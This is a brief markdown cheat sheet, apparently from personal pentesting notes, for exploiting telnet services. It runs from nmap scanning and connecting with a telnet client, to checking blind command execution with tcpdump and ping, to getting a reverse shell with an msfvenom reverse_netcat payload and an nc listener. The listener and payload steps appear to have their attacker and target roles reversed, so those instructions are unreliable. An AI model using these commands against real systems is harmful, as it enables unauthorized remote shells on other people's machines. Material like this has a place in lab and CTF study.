## Telnet (a net so tel)
​
Is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.
​
​
### Enumerating
​
1. #### Port Scanning
   - [[Nmap#Syn Scan]]
   
   ​
2. #### Gather Information
   - Take note for the information that matters
     
   ​
​
### Exploiting
​
1. #### Enter to the Void
   - Go:
   >[!Tip] Chebra
   >```
   >telnet {target IP} {port}
   >```
   
   ​
2. #### Try commands, try harder
   - It comes easy, if you are trying commands and nothing shows up in the output, then probably is just been executed as a system command. Several ways to try this, try this:
   ​
   - In your ==attacking machine==:
   >[!Tip] Chebra
   >```
   >sudo tcpdump ip proto \\icmp -i {net interface}
   >```
   
   - In the ==target machine==:
   >[!Tip] Chebra
   >```
   >ping {local IP} -c 1
   >```
   
   ​
3. #### Reverse and Forward
   - In your ==attacking machine==:
   >[!Tip] Chebra
   >```
   >msfvenom -p cmd/unix/reverse_netcat lhost={local IP} lport={random port} R
   >```
   
   - In the ==target machine==:
   >[!Tip] Chebra
   >```
   >nc -lvnp {same random port}
   >```
   
   ​
4. #### What's that shiiiiiiiiiiiiiiiit!?
   - Bob Sponge quote; meaning that you must take all advantaje... actually dont mean a shit